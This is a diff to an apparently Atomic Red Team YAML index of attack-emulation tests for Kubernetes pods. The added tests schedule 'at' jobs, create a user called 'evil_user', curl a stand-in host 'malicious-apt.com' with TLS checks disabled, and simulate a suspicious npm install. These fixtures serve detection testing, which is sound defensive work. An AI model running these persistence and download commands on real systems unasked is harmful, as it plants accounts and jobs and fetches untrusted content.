@@ -24222,7 +24222,48 @@ privilege-escalation:
       - 'Process: Process Creation'
       - 'File: File Modification'
       identifier: T1053.002
-    atomic_tests: []
+    atomic_tests:
+    - name: At - Schedule a job via kubectl in a Pod
+      auto_generated_guid: 9ddf2e5e-7e2c-46c2-9940-3c2ff29c7213
+      description: |
+        Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon,
+        and submits a job with `at`. The pod is deleted after execution.
+      supported_platforms:
+      - containers
+      input_arguments:
+        image_name:
+          description: Name of the image
+          type: string
+          default: ubuntu
+        pod_name:
+          description: K8s pod name to execute the command in
+          type: string
+          default: atomic-at-schedule
+        time_spec:
+          description: Time specification of when the command should run
+          type: string
+          default: now + 1 minute
+        at_command:
+          description: The command to be run
+          type: string
+          default: echo Hello from Atomic Red Team
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+          '
+        prereq_command: 'which kubectl
+
+          '
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach
+          --rm -i -- bash -lc "apt-get update -y >/dev/null 2>&1 && apt-get install
+          -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo ''#{at_command}''
+          | at #{time_spec} && at -l"
+
+          '
   T1055.001:
     technique:
       type: attack-pattern
@@ -27881,7 +27922,48 @@ execution:
       - 'Process: Process Creation'
       - 'File: File Modification'
       identifier: T1053.002
-    atomic_tests: []
+    atomic_tests:
+    - name: At - Schedule a job via kubectl in a Pod
+      auto_generated_guid: 9ddf2e5e-7e2c-46c2-9940-3c2ff29c7213
+      description: |
+        Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon,
+        and submits a job with `at`. The pod is deleted after execution.
+      supported_platforms:
+      - containers
+      input_arguments:
+        image_name:
+          description: Name of the image
+          type: string
+          default: ubuntu
+        pod_name:
+          description: K8s pod name to execute the command in
+          type: string
+          default: atomic-at-schedule
+        time_spec:
+          description: Time specification of when the command should run
+          type: string
+          default: now + 1 minute
+        at_command:
+          description: The command to be run
+          type: string
+          default: echo Hello from Atomic Red Team
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+          '
+        prereq_command: 'which kubectl
+
+          '
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach
+          --rm -i -- bash -lc "apt-get update -y >/dev/null 2>&1 && apt-get install
+          -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo ''#{at_command}''
+          | at #{time_spec} && at -l"
+
+          '
 persistence:
   T1053.005:
     technique:
@@ -31868,7 +31950,42 @@ persistence:
       - 'Process: Process Creation'
       - 'Command: Command Execution'
       identifier: T1136.001
-    atomic_tests: []
+    atomic_tests:
+    - name: Create a Linux user via kubectl in a Pod
+      auto_generated_guid: d9efa6c7-6518-42b2-809a-4f2a8e242b9b
+      description: |
+        Launches a short-lived Alpine pod and creates a Linux user inside the pod.
+        The pod is automatically deleted after execution.
+      supported_platforms:
+      - containers
+      input_arguments:
+        pod_name:
+          description: K8s pod_name to execute the command in
+          type: string
+          default: atomic-linux-useradd
+        username:
+          description: Username of the user to create inside the pod
+          type: string
+          default: evil_user
+        image_name:
+          description: Name of the docker image
+          type: string
+          default: alpine
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+          '
+        prereq_command: 'which kubectl
+
+          '
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm
+          -it -- sh -lc ''adduser -D #{username} && id #{username}''
+
+          '
   T1176.002:
     technique:
       type: attack-pattern
@@ -37108,7 +37225,48 @@ persistence:
       - 'Process: Process Creation'
       - 'File: File Modification'
       identifier: T1053.002
-    atomic_tests: []
+    atomic_tests:
+    - name: At - Schedule a job via kubectl in a Pod
+      auto_generated_guid: 9ddf2e5e-7e2c-46c2-9940-3c2ff29c7213
+      description: |
+        Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon,
+        and submits a job with `at`. The pod is deleted after execution.
+      supported_platforms:
+      - containers
+      input_arguments:
+        image_name:
+          description: Name of the image
+          type: string
+          default: ubuntu
+        pod_name:
+          description: K8s pod name to execute the command in
+          type: string
+          default: atomic-at-schedule
+        time_spec:
+          description: Time specification of when the command should run
+          type: string
+          default: now + 1 minute
+        at_command:
+          description: The command to be run
+          type: string
+          default: echo Hello from Atomic Red Team
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+          '
+        prereq_command: 'which kubectl
+
+          '
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach
+          --rm -i -- bash -lc "apt-get update -y >/dev/null 2>&1 && apt-get install
+          -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo ''#{at_command}''
+          | at #{time_spec} && at -l"
+
+          '
   T1556:
     technique:
       type: attack-pattern
@@ -40196,7 +40354,40 @@ command-and-control:
       - 'Command: Command Execution'
       - 'Network Traffic: Network Connection Creation'
       identifier: T1105
-    atomic_tests: []
+    atomic_tests:
+    - name: Curl Insecure Connection from a Pod
+      auto_generated_guid: 7e2ad0db-1efa-4af2-a77c-bc6e87d7b3f3
+      description: |
+        Launches an Ubuntu pod, installs curl, and executes curl with insecure flags (-k/--insecure)
+        against a target URL. The pod is automatically deleted after execution.
+      supported_platforms:
+      - containers
+      input_arguments:
+        pod_name:
+          description: K8s pod_name to execute the command in
+          type: string
+          default: atomic-insecure-curl
+        remote_url:
+          description: Remote URL to curl
+          type: string
+          default: https://malicious-apt.com
+        image_name:
+          description: Name of the docker image
+          type: string
+          default: curlimages/curl
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+          '
+        prereq_command: 'which kubectl
+
+          '
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm
+          -it -- curl -ksL #{remote_url}'
   T1665:
     technique:
       type: attack-pattern
@@ -62473,7 +62664,47 @@ initial-access:
       x_mitre_version: '1.1'
       x_mitre_data_sources:
       - 'File: File Metadata'
-    atomic_tests: []
+      identifier: T1195.002
+    atomic_tests:
+    - name: Simulate npm package installation on a Linux system
+      auto_generated_guid: a9604672-cd46-493b-b58f-fd4124c22dd3
+      description: 'Launches a short‑lived Kubernetes pod using the Node 18 image,
+        initializes a minimal npm project in /tmp/test, and installs the specified
+        npm package without audit/fund/package‑lock options, simulating potentially
+        suspicious package retrieval (e.g., typosquatting/dependency confusion) from
+        within a container. The pod is deleted after execution.
+
+        '
+      supported_platforms:
+      - containers
+      - linux
+      input_arguments:
+        image_name:
+          description: Name of the image
+          type: string
+          default: node:18
+        pod_name:
+          description: Name of the pod
+          type: string
+          default: atomic-npm-install
+        package_name:
+          description: NPM package to install
+          type: string
+          default: tinycolor
+      dependencies:
+      - description: kubectl must be installed and configured
+        get_prereq_command: echo "kubectl must be installed"
+        prereq_command: which kubectl
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach
+          --rm -i -- bash -lc "mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null
+          2>&1 && echo ''--- package.json before install ---'' && cat package.json
+          && npm install #{package_name} --no-audit --no-fund --no-package-lock &&
+          echo ''--- package.json after install ---'' && cat package.json"
+
+          '
   T1078.002:
     technique:
       type: attack-pattern
